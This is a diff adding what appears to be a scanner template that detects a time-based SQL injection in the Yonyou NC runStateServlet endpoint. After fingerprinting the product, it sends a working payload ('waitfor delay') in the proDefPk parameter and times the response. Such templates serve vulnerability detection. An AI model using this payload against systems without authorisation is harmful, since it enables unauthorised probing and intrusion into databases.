@@ -1,0 +1,41 @@
+id: poc-yaml-yongyou-nc-runstateservlet-sqli
+info:
+  name: 用友NC runStateServlet SQL注入
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the 用友NC runStateServlet endpoint by checking for time delay responses.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /index.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "logo/images/logo.gif"
+        part: body
+
+  - raw:
+      - |
+        GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1%27waitfor+delay+%270:0:{{t1}}%27--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
